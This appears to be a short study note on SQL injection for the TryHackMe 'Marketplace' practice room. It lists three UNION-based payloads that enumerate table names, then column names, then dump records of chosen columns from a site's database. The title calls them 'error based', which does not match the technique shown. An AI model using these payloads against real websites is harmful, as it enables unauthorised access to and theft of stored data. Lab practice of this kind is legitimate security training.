
💉

SQL INJECTION - ERROR BASED
===========================

**This is a very simple example of how a SQL Injection error based looks like.**

Room to practice → **Tryhackme**: Marketplace

**Get all the table names of the current database**

    payload=1234 union select group_concat(table_name),2,3,4 from information_schema.tables where table_schema=database() -- -

**Get all the columns names of the specified table**

    payload=123 union select group_concat(column_name),2,3,4 from information_schema.columns where table_name='<TABLE-NAME>' -- -

**Get all records of the specified columns of the given table**

    payload=123 union select group_concat(<column_name1>,<column_name2>),2,3,4 from <TABLE-NAME>-- -
